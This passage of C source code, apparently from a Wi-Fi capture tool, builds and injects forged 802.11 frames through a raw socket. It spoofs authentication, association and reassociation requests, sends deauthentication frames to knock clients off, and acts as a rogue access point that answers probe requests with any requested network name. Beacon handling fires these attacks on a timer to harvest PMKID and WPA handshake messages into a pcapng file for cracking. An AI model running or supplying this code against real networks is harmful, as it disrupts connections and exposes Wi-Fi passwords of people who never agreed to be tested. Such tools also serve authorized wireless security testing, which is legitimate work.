0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x00, 0x00,
};
#define REASSOCIATIONREQUESTWPA2_SIZE sizeof(reassociationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
memcpy(macftx->addr1, zeiger->macap, 6);
memcpy(macftx->addr2, macclient, 6);
memcpy(macftx->addr3, zeiger->macap, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence >= 4096) clientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, zeiger->macap, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE], &reassociationrequestwpa2data, REASSOCIATIONREQUESTWPA2_SIZE);
if((zeiger->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x25] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x25] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x2b] = CS_CCMP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x31] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x31] = AK_PSKSHA256;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA2_SIZE) == -1) errorcount++;
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa2(uint8_t *macclient, aplist_t *zeiger)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa2data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x00, 0x00,
/* HT capabilites */
0x2d, 0x1a, 0x6e, 0x18, 0x1f, 0xff, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x96,
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA2_SIZE sizeof(associationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, zeiger->macap, 6);
memcpy(macftx->addr2, macclient, 6);
memcpy(macftx->addr3, zeiger->macap, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence >= 4096) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE], &associationrequestwpa2data, ASSOCIATIONREQUESTWPA2_SIZE);
if((zeiger->groupcipher &TCS_CCMP) == TCS_CCMP) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x17] = CS_CCMP;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x17] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x1d] = CS_CCMP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x23] = AK_PSK;
else packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x23] = AK_PSKSHA256;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA2_SIZE) == -1) errorcount++;
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa1(uint8_t *macclient, aplist_t *zeiger)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa1data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* WPA information (WPA1) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* pairwise cipher */
0x01, 0x00,  /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
};
#define REASSOCIATIONREQUESTWPA1_SIZE sizeof(reassociationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
memcpy(macftx->addr1, zeiger->macap, 6);
memcpy(macftx->addr2, macclient, 6);
memcpy(macftx->addr3, zeiger->macap, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence >= 4096) clientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, zeiger->macap, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE], &reassociationrequestwpa1data, REASSOCIATIONREQUESTWPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x29] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x2f] = CS_TKIP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x35] = AK_PSK;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA1_SIZE) == -1) errorcount++;
return;
}
/*===========================================================================*/
static inline void send_association_req_wpa1(uint8_t *macclient, aplist_t *zeiger)
{
static mac_t *macftx;

static const uint8_t associationrequestcapa[] =
{
0x31, 0x04, 0x05, 0x00
};
#define ASSOCIATIONREQUESTCAPA_SIZE sizeof(associationrequestcapa)

static const uint8_t associationrequestwpa1data[] =
{
/* supported rates */
0x01, 0x08, 0x02, 0x04, 0x0b, 0x16, 0x0c, 0x12, 0x18, 0x24,
/* extended supported rates */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* WPA information (WPA1) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* pairwise cipher */
0x01, 0x00,  /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
/* extended capabilites */
0x7f, 0x08, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x40,
/* supported operating classes */
0x3b, 0x14, 0x51, 0x51, 0x53, 0x54, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c,
0x7d, 0x7e, 0x7f, 0x80, 0x81, 0x82,
/* WMM/WME */
0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00
};
#define ASSOCIATIONREQUESTWPA1_SIZE sizeof(associationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +ASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_ASSOC_REQ;
memcpy(macftx->addr1, zeiger->macap, 6);
memcpy(macftx->addr2, macclient, 6);
memcpy(macftx->addr3, zeiger->macap, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence >= 4096) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE], &associationrequestwpa1data, ASSOCIATIONREQUESTWPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x1b] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x21] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +0x27] = AK_PSK;
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONREQUESTCAPA_SIZE +zeiger->essidlen +IETAG_SIZE +ASSOCIATIONREQUESTWPA1_SIZE) == -1) errorcount++;
return;
}
/*===========================================================================*/
static inline void process80211authentication_rg_resp()
{
static aplist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return;
	if(memcmp(zeiger->macap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	send_ack();
	if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_association_req_wpa2(macfrx->addr1, zeiger);
	else if ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_association_req_wpa1(macfrx->addr1, zeiger);
	return;
	}
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211authentication()
{
static authf_t *auth;

auth = (authf_t*)payloadptr;
if(payloadlen < AUTHENTICATIONFRAME_SIZE) return;
if(auth->algorithm != OPEN_SYSTEM)
	{
	writeepb(fd_pcapng);
	return;
	}
if((auth->sequence %2) == 1)
	{

	}
else if((auth->sequence %2) == 0)
	{


	}

writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void send_authentication_req_opensystem(uint8_t *macclient, uint8_t *macap)
{
static mac_t *macftx;

static const uint8_t authenticationrequestdata[] =
{
0x00, 0x00, 0x01, 0x00, 0x00, 0x00
};
#define MYAUTHENTICATIONREQUEST_SIZE sizeof(authenticationrequestdata)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_AUTH;
memcpy(macftx->addr1, macap, 6);
memcpy(macftx->addr2, macclient, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = clientsequence++ << 4;
if(clientsequence >= 4096) clientsequence = 1;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM], &authenticationrequestdata, MYAUTHENTICATIONREQUEST_SIZE);
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +MYAUTHENTICATIONREQUEST_SIZE) == -1) errorcount++;
return;
}
/*===========================================================================*/
static inline void send_probe_resp(uint8_t *macclient, rgaplist_t *zeigerrgap)
{
static mac_t *macftx;
static capap_t *capap;
const uint8_t proberesponse_data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,
/* Tag: DS Parameter set: Current Channel: 1 */
0x03, 0x01, 0x01,
/* Tag: ERP Information */
0x2a, 0x01, 0x04,
/* Tag: Extended Supported Rates 24, 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0x30, 0x48, 0x60, 0x6c,
/* Tag: RSN Information WPA1 & WPA2 PSK */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x04,
0x01, 0x00,
0x00, 0x0f, 0xac, 0x02,
0x00, 0x00,
/* Tag: Vendor Specific: Microsoft Corp.: WPA Information Element */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02,
0x01, 0x00,
0x00, 0x50, 0xf2, 0x02
};
#define PROBERESPONSE_DATA_SIZE sizeof(proberesponse_data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +ESSID_LEN_MAX +IETAG_SIZE +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_PROBE_RESP;
memcpy(macftx->addr1, macclient, 6);
memcpy(macftx->addr2, zeigerrgap->macrgap, 6);
memcpy(macftx->addr3, zeigerrgap->macrgap, 6);
macftx->sequence = apsequence++ << 4;
if(apsequence >= 4096) apsequence = 1;
capap = (capap_t*)(packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
capap->timestamp = mytime++;
capap->beaconintervall = 0x64;
capap->capabilities = 0x431;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE] = 0;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +1] = zeigerrgap->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE], zeigerrgap->essid, zeigerrgap->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerrgap->essidlen], &proberesponse_data, PROBERESPONSE_DATA_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerrgap->essidlen +0x0c] = channelscanlist[csc];
if(write(fd_socket, packetoutptr, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESAP_SIZE +IETAG_SIZE +zeigerrgap->essidlen +PROBERESPONSE_DATA_SIZE) == -1) errorcount++;
return;
}
/*===========================================================================*/
static inline void process80211probe_req()
{
static rgaplist_t *zeiger;
static uint8_t essidlen;
static uint8_t *essidptr;

if(payloadlen < IETAG_SIZE) return;
essidlen = gettagessid(payloadlen, payloadptr, &essidptr);
if(essidlen == 0) return;
for(zeiger = rgaplist; zeiger < rgaplist +RGAPLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(zeiger->essidlen != essidlen) continue;
	if(memcmp(zeiger->essid, essidptr, essidlen) != 0) continue;
	zeiger->timestamp = timestamp;
	send_probe_resp(macfrx->addr2, zeiger);
	return;
	}
memset(zeiger, 0, RGAPLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->essidlen = essidlen;
memcpy(zeiger->essid, essidptr, essidlen);
zeiger->macrgap[5] = nicrgap & 0xff;
zeiger->macrgap[4] = (nicrgap >> 8) & 0xff;
zeiger->macrgap[3] = (nicrgap >> 16) & 0xff;
zeiger->macrgap[2] = ouirgap & 0xff;
zeiger->macrgap[1] = (ouirgap >> 8) & 0xff;
zeiger->macrgap[0] = (ouirgap >> 16) & 0xff;
nicrgap += 1;
send_probe_resp(macfrx->addr2, zeiger);
qsort(rgaplist, zeiger -rgaplist +1, RGAPLIST_SIZE, sort_rgaplist_by_time);
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211probe_resp()
{
static int apinfolen;
static uint8_t *apinfoptr;
static aplist_t *zeiger;

if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->macap, macfrx->addr2, 6) != 0) continue;
	gettags(apinfolen, apinfoptr, aplist);
	if(channelscanlist[csc] != zeiger->channel) return;
	zeiger->timestamp = timestamp;
	gettags(apinfolen, apinfoptr, aplist);
	if((zeiger->status & STATUS_PRESP) != STATUS_PRESP) writeepb(fd_pcapng);
	zeiger->status |= STATUS_PRESP;
	return;
	}
memset(zeiger, 0, APLIST_SIZE);
gettags(apinfolen, apinfoptr, zeiger);
if(channelscanlist[csc] != zeiger->channel) return;
zeiger->timestamp = timestamp;
zeiger->status = STATUS_PRESP;
memcpy(zeiger->macap, macfrx->addr2, 6);
gettags(apinfolen, apinfoptr, aplist);
qsort(aplist, zeiger -aplist +1, APLIST_SIZE, sort_aplist_by_time);
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process80211beacon()
{
static int apinfolen;
static uint8_t *apinfoptr;
static aplist_t *zeiger;

if(payloadlen < CAPABILITIESAP_SIZE +IETAG_SIZE) return;
apinfoptr = payloadptr +CAPABILITIESAP_SIZE;
apinfolen = payloadlen -CAPABILITIESAP_SIZE;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->macap, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status & STATUS_BEACON) != STATUS_BEACON) writeepb(fd_pcapng);
	zeiger->status |= STATUS_BEACON;
	zeiger->count += 1;
	if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256))
		{
		if(((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) || ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE))
			{
#ifdef GETM1
			if((zeiger->eapolstatus &EAPOLM1) != EAPOLM1)
				{
				if((zeiger->count %BEACONPMKIDINTERVALL) == 0) send_authentication_req_opensystem(macrgclient, macfrx->addr2);
				}
#endif
#ifdef GETM1234
			if(zeiger->eapolstatus < EAPOLM2M3)
				{
				if((zeiger->count %REMOVECLIENTINTERVALL) == 0) memset(zeiger->lastmacclient, 0xff, 6);
				if((zeiger->count %BEACONREASSOCINTERVALL) == 0)
					{
					if((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) send_reassociation_req_wpa2(zeiger->lastmacclient, zeiger);
					else if ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE) send_reassociation_req_wpa1(zeiger->lastmacclient, zeiger);
					}
				else if((zeiger->count %BEACONDEAUTHINTERVALL) == 0) send_deauthentication(zeiger->lastmacclient, macfrx->addr2, WLAN_REASON_DISASSOC_AP_BUSY);
				}
#endif
			}
		}
	return;
	}
memset(zeiger, 0, APLIST_SIZE);
gettags(apinfolen, apinfoptr, zeiger);
if(channelscanlist[csc] != zeiger->channel) return;
zeiger->timestamp = timestamp;
zeiger->count += 1;
zeiger->status = STATUS_BEACON;
memcpy(zeiger->macap, macfrx->addr2, 6);
memset(zeiger->lastmacclient, 0xff, 6);
#ifdef GETM1
send_authentication_req_opensystem(zeiger->lastmacclient, macfrx->addr2);
#endif
#ifdef GETM1234
if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256))
	{
	if(((zeiger->kdversion &KV_RSNIE) == KV_RSNIE) || ((zeiger->kdversion &KV_WPAIE) == KV_WPAIE)) send_association_req_wpa2(macfrx->addr1, zeiger);
	}
send_deauthentication(macfrx->addr1, macfrx->addr2, WLAN_REASON_UNSPECIFIED);
#endif
qsort(aplist, zeiger -aplist +1, APLIST_SIZE, sort_aplist_by_time);
writeepb(fd_pcapng);
return;
}
/*===========================================================================*/
static inline void process_packet()
{
static int rthl;
static rth_t *rth;
static uint32_t rthp;

packetlen = recvfrom(sd_socket, epb +EPB_SIZE, PCAPNG_MAXSNAPLEN, 0, NULL, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000) + tv.tv_usec;
if(packetlen < 0)
	{
	errorcount++;
	return;
	}
if(packetlen == 0)
	{
	errorcount++;
	return;
	}
if(packetlen < (int)RTH_SIZE)
	{
	errorcount++;
	return;
	}
packetptr = &epb[EPB_SIZE];
rth = (rth_t*)packetptr;
if(rth->it_version != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_pad != 0)
	{
	errorcount++;
	return;
	}
if(rth->it_present == 0)
	{
	errorcount++;
	return;
	}
rthl = le16toh(rth->it_len);
if(rthl > packetlen)
	{
	errorcount++;
	return;
	}
rthp = le32toh(rth->it_present);
if((rthp & IEEE80211_RADIOTAP_TX_FLAGS) == IEEE80211_RADIOTAP_TX_FLAGS) return;
ieee82011ptr = packetptr +rthl;
ieee82011len = packetlen -rthl;
if(ieee82011len < MAC_SIZE_ACK) return;
tvlast.tv_sec = tv.tv_sec;
macfrx = (mac_t*)ieee82011ptr;
if((macfrx->from_ds == 1) && (macfrx->to_ds == 1))
	{
	payloadptr = ieee82011ptr +MAC_SIZE_LONG;
	payloadlen = ieee82011len -MAC_SIZE_LONG;
	}
else
	{
	payloadptr = ieee82011ptr +MAC_SIZE_NORM;
	payloadlen = ieee82011len -MAC_SIZE_NORM;
	}
if(macfrx->type == IEEE80211_FTYPE_MGMT)
	{
	if(macfrx->subtype == IEEE80211_STYPE_BEACON) process80211beacon();
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) process80211probe_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_PROBE_REQ) process80211probe_req();
	else if(macfrx->subtype == IEEE80211_STYPE_AUTH)
		{
		if(memcmp(macfrx->addr1, &macrgclient, 6) == 0) process80211authentication_rg_resp();
		else process80211authentication();
		}
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_REQ) process80211association_req();
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_REQ) process80211reassociation_req();
	else if(macfrx->subtype == IEEE80211_STYPE_ASSOC_RESP) process80211association_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_REASSOC_RESP) process80211reassociation_resp();
	else if(macfrx->subtype == IEEE80211_STYPE_ACTION) process80211action();
	}
else if(macfrx->type == IEEE80211_FTYPE_CTL)
	{
	if(macfrx->subtype == IEEE80211_STYPE_BACK) process80211blockack();
	else if(macfrx->subtype == IEEE80211_STYPE_BACK_REQ) process80211blockack_req();
	else if(macfrx->subtype == IEEE80211_STYPE_PSPOLL) process80211powersave_poll();
	}
else if(macfrx->type == IEEE80211_FTYPE_DATA)
	{
	if((macfrx->subtype &IEEE80211_STYPE_QOS_DATA) == IEEE80211_STYPE_QOS_DATA)
		{
		payloadptr += QOS_SIZE;
		payloadlen -= QOS_SIZE;
		}
	if((macfrx->subtype &IEEE80211_STYPE_NULLFUNC) == IEEE80211_STYPE_NULLFUNC) process80211null();
	else if((macfrx->subtype &IEEE80211_STYPE_QOS_NULLFUNC) == IEEE80211_STYPE_QOS_NULLFUNC) process80211qosnull();
	if(payloadlen < LLC_SIZE) return;
	llcptr = payloadptr;
	llc = (llc_t*)llcptr;
	if(((ntohs(llc->type)) == LLC_TYPE_AUTH) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP)) process80211eap();
#ifdef DUMPALL
	else writeepb(fd_pcapng);
#endif
	}
return;
}
/*===========================================================================*/
static inline bool set_channel()
{
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
memcpy(pwrq.ifr_name, ifname, IFNAMSIZ);
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = channelscanlist[csc];
pwrq.u.freq.e = 0;
if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) < 0) return false;
return true;
}
/*===========================================================================*/
static inline void fdloopscan()
{
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;
static struct timespec sleepled;
static int cgc;

fprintf(stdout, "%s entered loop on channels ", ifname);
cgc = 0;
while(channelscanlist[cgc] != 0)
	{
	fprintf(stdout, "%d ", channelscanlist[cgc]);
	cgc++;
	}
fprintf(stdout, "\n");
sleepled.tv_sec = 0;
